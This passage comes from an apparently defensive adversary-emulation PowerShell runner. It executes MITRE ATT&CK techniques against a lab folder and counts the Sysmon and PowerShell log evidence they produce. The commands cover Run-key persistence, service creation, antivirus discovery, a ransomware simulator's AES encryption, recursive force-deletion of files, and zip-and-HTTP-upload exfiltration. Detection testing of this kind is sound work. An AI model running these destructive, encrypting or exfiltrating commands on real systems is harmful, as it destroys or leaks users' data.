$tec004Delete = Invoke-CmdLine -Command 'reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f' -Description "TEC-004 delete Run key" -IgnoreExitCode
$tec004End = Get-Date
Set-TechResult `
    -ScriptExecuted "reg.exe" `
    -ScriptPath "C:\Windows\System32\reg.exe" `
    -ExitCode $tec004Add.ExitCode `
    -ExpectedEvidence @("Run key add", "Run key query", "Run key delete", "Sysmon ID 12/13/14 if enabled") `
    -FoundEvidence @("AddExit=$($tec004Add.ExitCode)", "QueryExit=$($tec004Query.ExitCode)", "DeleteExit=$($tec004Delete.ExitCode)") `
    -SysmonRelevantEvents (Get-WinEventCountSafe -LogName 'Microsoft-Windows-Sysmon/Operational' -Ids @(1,12,13,14) -StartTime $script:CurrentTechnique.Start -EndTime $tec004End -MessageRegex 'reg\.exe|CurrentVersion\\Run|TFM_T1547_001_test') `
    -PowerShell4104RelevantEvents 0 `
    -Status $(if ($tec004Add.ExitCode -eq 0) { "OK" } else { "WARN" }) `
    -Comment "Run Key persistence evidence generated without relying on lab paths as detector IOC."
End-Test -Tec "TEC-004"

Start-Test -Tec "TEC-005" -Name "Service Execution / T1569.002"
$tec005Create = Invoke-CmdLine -Command 'sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand' -Description "TEC-005 create service"
Start-Sleep -Seconds $ShortPauseSeconds
$tec005Query = Invoke-CmdLine -Command 'sc.exe qc "TFM TEC005 Test Service"' -Description "TEC-005 query service config" -IgnoreExitCode
Start-Sleep -Seconds $ShortPauseSeconds
$tec005Start = Invoke-CmdLine -Command 'sc.exe start "TFM TEC005 Test Service"' -Description "TEC-005 try service start" -IgnoreExitCode
Start-Sleep -Seconds $ShortPauseSeconds
$tec005Delete = Invoke-CmdLine -Command 'sc.exe delete "TFM TEC005 Test Service"' -Description "TEC-005 delete service" -IgnoreExitCode
$tec005End = Get-Date
Set-TechResult `
    -ScriptExecuted "sc.exe" `
    -ScriptPath "C:\Windows\System32\sc.exe" `
    -ExitCode $tec005Create.ExitCode `
    -ExpectedEvidence @("Service creation", "System 7045", "Sysmon ID 1 sc.exe", "Service start attempt may fail with 1053") `
    -FoundEvidence @("CreateExit=$($tec005Create.ExitCode)", "QueryExit=$($tec005Query.ExitCode)", "StartExit=$($tec005Start.ExitCode)", "DeleteExit=$($tec005Delete.ExitCode)") `
    -SysmonRelevantEvents (Get-WinEventCountSafe -LogName 'Microsoft-Windows-Sysmon/Operational' -Ids @(1) -StartTime $script:CurrentTechnique.Start -EndTime $tec005End -MessageRegex 'sc\.exe|TFM TEC005 Test Service') `
    -PowerShell4104RelevantEvents 0 `
    -Status $(if ($tec005Create.ExitCode -eq 0) { "OK" } else { "WARN" }) `
    -Comment "Service creation is primary evidence; start failure is expected for cmd.exe service wrapper."
End-Test -Tec "TEC-005"

Start-Test -Tec "TEC-006" -Name "Security Software Discovery / T1518.001"
$tec006Ps = Invoke-CmdLine -Command 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"' -Description "TEC-006 PowerShell AV/EDR discovery"
Start-Sleep -Seconds $ShortPauseSeconds
$tec006Wmic = Invoke-CmdLine -Command 'cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"' -Description "TEC-006 WMIC AV discovery" -IgnoreExitCode
$tec006End = Get-Date
Set-TechResult `
    -ScriptExecuted "powershell.exe; wmic.exe" `
    -ScriptPath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; C:\Windows\System32\wbem\wmic.exe" `
    -ExitCode $tec006Ps.ExitCode `
    -ExpectedEvidence @("SecurityCenter2 query", "AntivirusProduct", "Defender service discovery", "WMIC discovery", "4104 and Sysmon ID 1 if enabled") `
    -FoundEvidence @("PowerShellExit=$($tec006Ps.ExitCode)", "WMICExit=$($tec006Wmic.ExitCode)", "PowerShellStdout=$((Convert-ToInlineLog $tec006Ps.Stdout))") `
    -SysmonRelevantEvents (Get-WinEventCountSafe -LogName 'Microsoft-Windows-Sysmon/Operational' -Ids @(1) -StartTime $script:CurrentTechnique.Start -EndTime $tec006End -MessageRegex 'SecurityCenter2|AntivirusProduct|WinDefend|SecurityHealthService|wmic|powershell') `
    -PowerShell4104RelevantEvents (Get-WinEventCountSafe -LogName 'Microsoft-Windows-PowerShell/Operational' -Ids @(4104) -StartTime $script:CurrentTechnique.Start -EndTime $tec006End -MessageRegex 'SecurityCenter2|AntivirusProduct|WinDefend|SecurityHealthService|Get-CimInstance') `
    -Status $(if ($tec006Ps.ExitCode -eq 0) { "OK" } else { "WARN" }) `
    -Comment "Security software discovery evidence generated; WMIC may be absent/deprecated."
End-Test -Tec "TEC-006"

Start-Test -Tec "TEC-007" -Name "Data Encrypted for Impact / T1486"
Restore-DumbLab -Mode "Ransomware"
Assert-DumbLabSafe
$tec007Enum = $null
$tec007Ransom = $null
if ($EnumScript) {
    if ((Split-Path -Leaf $EnumScript) -ieq "enumeracion_v2.ps1") {
        $tec007Enum = Invoke-PSFileIfExists -ScriptPath $EnumScript -Description "TEC-007 generate file list for controlled encryption" -Arguments ('-TargetPath "{0}" -OutputDir "{1}"' -f $DumbLab, (Split-Path -Parent $EnumScript)) -IgnoreExitCode
    }
    else {
        $tec007Enum = Invoke-PSFileIfExists -ScriptPath $EnumScript -Description "TEC-007 generate file list for controlled encryption" -IgnoreExitCode
    }
}
else {
    Write-Step "TEC-007 enumeration script not found." "ERROR"
}
if ($RansomScript) {
    if ((Split-Path -Leaf $RansomScript) -ieq "Scriptransom_v2.ps1") {
        $ransomScriptDir = Split-Path -Parent $RansomScript
        $listFile = Join-Path $ransomScriptDir "lista_archivos.csv"
        $passwordFile = Join-Path $RansomDir "password.txt"
        $tec007Ransom = Invoke-PSFileIfExists -ScriptPath $RansomScript -Description "TEC-007 run controlled AES encryption" -Arguments ('-WorkDir "{0}" -ListFile "{1}" -PasswordFile "{2}" -MaxFiles 25' -f $DumbLab, $listFile, $passwordFile) -IgnoreExitCode
    }
    else {
        $tec007Ransom = Invoke-PSFileIfExists -ScriptPath $RansomScript -Description "TEC-007 run controlled AES encryption" -IgnoreExitCode
    }
}
else {
    Write-Step "TEC-007 ransomware simulator script not found." "ERROR"
}
$aesFiles = @(Get-ChildItem -LiteralPath $DumbLab -Recurse -File -Filter "*.aes" -ErrorAction SilentlyContinue)
Write-Step ("TEC-007 validation .aes count before restore => {0}" -f $aesFiles.Count)
foreach ($file in ($aesFiles | Select-Object -First 10)) {
    Write-Step ("TEC-007 .aes evidence => {0}; Length={1}; LastWriteTime={2}" -f $file.FullName, $file.Length, $file.LastWriteTime.ToString("o"))
}
if ($aesFiles.Count -lt 1) { Write-Step "TEC-007 did not generate .aes files. Campaign not valid for CU-007." "ERROR" }
$tec007End = Get-Date
Set-TechResult `
    -ScriptExecuted $(if ($RansomScript) { Split-Path -Leaf $RansomScript } else { "" }) `
    -ScriptPath $(if ($RansomScript) { $RansomScript } else { "" }) `
    -ExitCode $(if ($tec007Ransom) { $tec007Ransom.ExitCode } else { -404 }) `
    -ExpectedEvidence @("AES/System.Security.Cryptography", "CryptoStream/CreateEncryptor", ".aes files", "PowerShell 4104", "Sysmon ID 11 if enabled") `
    -FoundEvidence @("EnumExit=$(if ($tec007Enum) { $tec007Enum.ExitCode } else { 'NA' })", "RansomExit=$(if ($tec007Ransom) { $tec007Ransom.ExitCode } else { 'NA' })", ".aesCount=$($aesFiles.Count)") `
    -SysmonRelevantEvents (Get-WinEventCountSafe -LogName 'Microsoft-Windows-Sysmon/Operational' -Ids @(1,11) -StartTime $script:CurrentTechnique.Start -EndTime $tec007End -MessageRegex 'powershell|Scriptransom|CryptoStream|CreateEncryptor|\.aes') `
    -PowerShell4104RelevantEvents (Get-WinEventCountSafe -LogName 'Microsoft-Windows-PowerShell/Operational' -Ids @(4104) -StartTime $script:CurrentTechnique.Start -EndTime $tec007End -MessageRegex 'System\.Security\.Cryptography|AES|CryptoStream|CreateEncryptor|\.aes') `
    -Status $(if ($aesFiles.Count -gt 0 -and $tec007Ransom -and $tec007Ransom.ExitCode -eq 0) { "OK" } else { "FAIL" }) `
    -Comment $(if ($aesFiles.Count -gt 0) { "Controlled encryption generated .aes evidence." } else { "No .aes files were observed; review TEC-007 script paths in VM." })
Start-Sleep -Seconds $ShortPauseSeconds
Restore-DumbLab -Mode "Ransomware"
End-Test -Tec "TEC-007"

Start-Test -Tec "TEC-008" -Name "Data Destruction / T1485"
Restore-DumbLab -Mode "Sabotaje"
Assert-DumbLabSafe
$beforeDeleteCount = @(Get-ChildItem -LiteralPath $DumbLab -Recurse -File -ErrorAction SilentlyContinue).Count
Write-Step ("TEC-008 files before deletion => {0}" -f $beforeDeleteCount)
$tec008Command = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$target = ''{0}''; Write-Host ''TEC008_OK''; Get-ChildItem $target -Recurse -File | ForEach-Object {{ Remove-Item $_.FullName -Force }}; Start-Sleep 3"' -f $DumbLab
$tec008Result = Invoke-CmdLine -Command $tec008Command -Description "TEC-008 controlled destructive deletion"
$afterDeleteCount = @(Get-ChildItem -LiteralPath $DumbLab -Recurse -File -ErrorAction SilentlyContinue).Count
Write-Step ("TEC-008 files after deletion => {0}" -f $afterDeleteCount)
$tec008End = Get-Date
Set-TechResult `
    -ScriptExecuted "powershell.exe inline controlled deletion" `
    -ScriptPath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
    -ExitCode $tec008Result.ExitCode `
    -ExpectedEvidence @("Get-ChildItem", "ForEach-Object", "Remove-Item -Force", "PowerShell 4104", "Sysmon ID 26 as forensic evidence if enabled") `
    -FoundEvidence @("ExitCode=$($tec008Result.ExitCode)", "FilesBefore=$beforeDeleteCount", "FilesAfter=$afterDeleteCount") `
    -SysmonRelevantEvents (Get-WinEventCountSafe -LogName 'Microsoft-Windows-Sysmon/Operational' -Ids @(1,23,26) -StartTime $script:CurrentTechnique.Start -EndTime $tec008End -MessageRegex 'powershell|Remove-Item|DUMB_LAB') `
    -PowerShell4104RelevantEvents (Get-WinEventCountSafe -LogName 'Microsoft-Windows-PowerShell/Operational' -Ids @(4104) -StartTime $script:CurrentTechnique.Start -EndTime $tec008End -MessageRegex 'Get-ChildItem|ForEach-Object|Remove-Item|TEC008') `
    -Status $(if ($tec008Result.ExitCode -eq 0 -and $beforeDeleteCount -gt $afterDeleteCount) { "OK" } else { "WARN" }) `
    -Comment "Controlled destructive deletion executed; Sysmon ID 26 remains forensic context, not individual alert."
Start-Sleep -Seconds $ShortPauseSeconds
Restore-DumbLab -Mode "Sabotaje"
End-Test -Tec "TEC-008"

Start-Test -Tec "TEC-009" -Name "Staging / ZIP / Controlled HTTP Upload / T1074.001 T1560.001 T1048.003"
Restore-DumbLab -Mode "Exfiltracion"
Assert-DumbLabSafe

$runStart = Get-Date
$tec009Result = $null
$tec009HttpStatus = ""
$tec009UploadSucceeded = ""
Write-Step ("TEC-009 runStart => {0}" -f $runStart.ToString("o"))
Write-Step ("TEC-009 ReceiverUrl => {0}" -f $ReceiverUrl)
Write-Step ("TEC-009 ExfilDir => {0}" -f $ExfilDir)
Write-Step ("TEC-009 ExfilScript => {0}" -f $ExfilScript)
Write-Step ("TEC-009 EnableExfilUpload => {0}" -f $EnableExfilUpload)
Write-Step ("TEC-009 ExfilTimeoutSec => {0}" -f $ExfilTimeoutSec)
Write-Step ("TEC-009 KeepExfilArtifacts => {0}" -f $KeepExfilArtifacts)

[void](Test-ReceiverEndpoint -Url $ReceiverUrl)

if (-not (Test-Path -LiteralPath $ExfilScript)) {
    Write-Step "TEC-009 exfiltracion_v3.ps1 not found in real technique directory. TEC-009 cannot run." "ERROR"
    $script:Tec009Details = [ordered]@{
        ExfilScriptAbsolutePath = $ExfilScript
        ReceiverUrl = $ReceiverUrl
        ReceiverPrecheck = $script:ReceiverPrecheck
        ExitCode = -404
        HttpStatus = ""
        UploadSucceeded = ""
        ZipLocal = @()
        PowerShell4104 = $null
    }
}
else {
    Push-Location $ExfilDir
    try {
        Write-Step ("TEC-009 executing from => {0}" -f (Get-Location).Path)
        $tec009Args = @(
            ('-ReceiverUrl "{0}"' -f $ReceiverUrl),
            ('-TimeoutSec {0}' -f $ExfilTimeoutSec)
        )
        if ($EnableExfilUpload) {
            $tec009Args += "-EnableUpload"
        }
        else {
            Write-Step "TEC-009 upload explicitly disabled by runner parameter." "WARN"
        }
        if ($KeepExfilArtifacts) {
            $tec009Args += "-KeepArtifacts"
        }
        $tec009Command = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -File "{0}" {1}' -f $ExfilScript, ($tec009Args -join " ")
        $tec009Result = Invoke-CmdLine -Command $tec009Command -Description "TEC-009 controlled staging/archive plus HTTP upload via exfiltracion_v3.ps1" -IgnoreExitCode
        Write-Step ("TEC-009 exfiltracion_v3.ps1 ExitCode => {0}" -f $tec009Result.ExitCode)
        Write-ResultFieldFromOutput -Name "TEC-009 HTTP status" -Output $tec009Result.Stdout -Regex 'HTTP status:\s*([^\r\n|]+)'
        Write-ResultFieldFromOutput -Name "TEC-009 Upload succeeded" -Output $tec009Result.Stdout -Regex 'Upload succeeded:\s*([^\r\n|]+)'
        $httpMatch = [regex]::Match($tec009Result.Stdout, 'HTTP status:\s*([^\r\n|]+)', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
        if ($httpMatch.Success) { $tec009HttpStatus = $httpMatch.Groups[1].Value.Trim() }
        $uploadMatch = [regex]::Match($tec009Result.Stdout, 'Upload succeeded:\s*([^\r\n|]+)', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
        if ($uploadMatch.Success) { $tec009UploadSucceeded = $uploadMatch.Groups[1].Value.Trim() }
    }
    finally {
        Pop-Location
        Write-Step ("TEC-009 returned to => {0}" -f (Get-Location).Path)
    }
}

$tec0094104 = Write-TEC009PowerShell4104Summary -RunStart $runStart
$tec009ZipFiles = @(
    Get-ChildItem -LiteralPath $ExfilDir -Recurse -File -Filter "*.zip" -ErrorAction SilentlyContinue |
    Sort-Object LastWriteTime -Descending |
    Select-Object -First 10 FullName,Length,LastWriteTime
)
$tec009End = Get-Date
$script:Tec009Details = [ordered]@{
    ExfilScriptAbsolutePath = $ExfilScript
    ReceiverUrl = $ReceiverUrl
    ReceiverPrecheck = $script:ReceiverPrecheck
    ExitCode = if ($tec009Result) { $tec009Result.ExitCode } else { -404 }
    HttpStatus = $tec009HttpStatus
    UploadSucceeded = $tec009UploadSucceeded
    ZipLocal = @($tec009ZipFiles)
    PowerShell4104 = $tec0094104
}
$tec009Status = if ($tec009Result -and $tec009Result.ExitCode -eq 0 -and $tec009UploadSucceeded -match 'True') {
    "OK"
} elseif ($tec009Result -and $tec009Result.ExitCode -ne 0) {
    "FAIL"
} else {
    "WARN"
}
Set-TechResult `
    -ScriptExecuted "exfiltracion_v3.ps1" `
    -ScriptPath $ExfilScript `
    -ExitCode $(if ($tec009Result) { $tec009Result.ExitCode } else { -404 }) `
    -ExpectedEvidence @("ZIP", "local ZIP copy", "SHA256", "Invoke-WebRequest", "-Method POST", "-InFile", "application/zip", "HTTP status 200", "Upload succeeded True", "PowerShell 4104") `
    -FoundEvidence @("ReceiverReachable=$(if ($script:ReceiverPrecheck) { $script:ReceiverPrecheck['Reachable'] } else { 'NA' })", "HTTPStatus=$tec009HttpStatus", "UploadSucceeded=$tec009UploadSucceeded", "ZipCount=$($tec009ZipFiles.Count)", "PS4104=$($tec0094104.Count)") `
    -SysmonRelevantEvents (Get-WinEventCountSafe -LogName 'Microsoft-Windows-Sysmon/Operational' -Ids @(1,3,11,22) -StartTime $script:CurrentTechnique.Start -EndTime $tec009End -MessageRegex 'powershell|pwsh|Invoke-WebRequest|InFile|POST|application/zip|8088|\.zip|http') `
    -PowerShell4104RelevantEvents $tec0094104.Count `
    -Status $tec009Status `
    -Comment $(if ($tec009Status -eq "OK") { "Controlled HTTP ZIP upload completed." } elseif ($tec009Result -and $tec009Result.ExitCode -ne 0) { "TEC-009 execution failed; check receiver and exfiltration output." } else { "TEC-009 produced partial evidence; review receiver and 4104 visibility." })
Start-Sleep -Seconds $ShortPauseSeconds
Restore-DumbLab -Mode "Exfiltracion"
End-Test -Tec "TEC-009"

Write-Step "Final dataset restore"
Restore-DumbLab -Mode "All"
$CampaignEnd = Get-Date
Write-Step "Candidate campaign v4 finished"
Write-Step ("Final log: {0}" -f $LogFile)
[void](Write-CampaignSummary -CampaignEnd $CampaignEnd)
